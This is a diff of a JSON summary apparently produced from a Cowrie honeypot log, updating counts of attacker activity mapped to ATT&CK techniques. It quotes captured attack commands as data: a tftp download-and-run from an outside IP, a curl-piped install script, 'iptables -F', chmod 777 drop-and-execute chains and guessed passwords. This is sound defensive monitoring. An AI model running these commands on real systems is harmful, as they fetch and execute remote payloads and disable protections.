@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-30 02:02:44",
+  "generated": "2026-08-30 03:02:44",
   "totals": {
-    "commands": 37,
-    "login_failed": 127,
-    "login_success": 4,
-    "sessions": 175
+    "commands": 67,
+    "login_failed": 179,
+    "login_success": 8,
+    "sessions": 246
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 127,
+      "count": 179,
       "examples": [
         "ubuntu / Nexus@123",
         "root / 1234567",
@@ -21,30 +21,14 @@
         "user / primera"
       ],
       "first": "2026-08-30T00:00:29.406804Z",
-      "last": "2026-08-30T02:02:44.677012Z",
-      "unique_ips": 11
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 15,
-      "examples": [
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
-        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
-        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
-        ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
-      ],
-      "first": "2026-08-30T01:49:59.206075Z",
-      "last": "2026-08-30T01:50:35.839215Z",
-      "unique_ips": 1
+      "last": "2026-08-30T03:02:00.783929Z",
+      "unique_ips": 15
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 6,
+      "count": 19,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -53,22 +37,40 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-30T01:35:44.711229Z",
-      "last": "2026-08-30T01:50:35.839215Z",
+      "last": "2026-08-30T02:27:03.057291Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 16,
+      "examples": [
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
+        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/",
+        ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
+      ],
+      "first": "2026-08-30T01:49:59.206075Z",
+      "last": "2026-08-30T02:18:50.931246Z",
       "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 4,
+      "count": 8,
       "examples": [
         "ubuntu / ubuntu",
         "root / 123@@@",
-        "root / root"
+        "root / root",
+        "root / wabjtam",
+        "admin / admin"
       ],
       "first": "2026-08-30T01:15:05.883790Z",
-      "last": "2026-08-30T01:49:58.763408Z",
-      "unique_ips": 3
+      "last": "2026-08-30T02:26:49.107042Z",
+      "unique_ips": 7
     },
     {
       "id": "T1033",
@@ -93,12 +95,48 @@
       "first": "2026-08-30T01:15:18.300668Z",
       "last": "2026-08-30T01:15:18.300668Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1562.004",
+      "name": "Impair Defenses: Disable or Modify System Firewall",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "iptables -F"
+      ],
+      "first": "2026-08-30T02:27:00.005002Z",
+      "last": "2026-08-30T02:27:00.005002Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "/bin/busybox",
-      7
+      10
+    ],
+    [
+      "enable",
+      3
+    ],
+    [
+      "system",
+      3
+    ],
+    [
+      "shell",
+      3
+    ],
+    [
+      "sh",
+      3
+    ],
+    [
+      "linuxshell",
+      2
+    ],
+    [
+      "ping ;sh",
+      2
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
@@ -113,31 +151,7 @@
       1
     ],
     [
-      "enable",
-      1
-    ],
-    [
-      "system",
-      1
-    ],
-    [
-      "shell",
-      1
-    ],
-    [
-      "sh",
-      1
-    ],
-    [
-      "linuxshell",
-      1
-    ],
-    [
       "enablelinuxshell",
-      1
-    ],
-    [
-      "ping ;sh",
       1
     ],
     [
@@ -146,6 +160,34 @@
     ],
     [
       "cd /proc && cat self/cmdline",
+      1
+    ],
+    [
+      "ping; sh",
+      1
+    ],
+    [
+      "/bin/busybox STC",
+      1
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      1
+    ],
+    [
+      "/bin/busybox echo > /tmp/.fxcat && sh /tmp/.fxcat && cd /tmp/",
+      1
+    ],
+    [
+      "/bin/busybox echo > /var/.fxcat && sh /var/.fxcat && cd /var/",
+      1
+    ],
+    [
+      "/bin/busybox echo > /var/run/.fxcat && sh /var/run/.fxcat && cd /var/run/",
+      1
+    ],
+    [
+      "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
       1
     ]
   ]
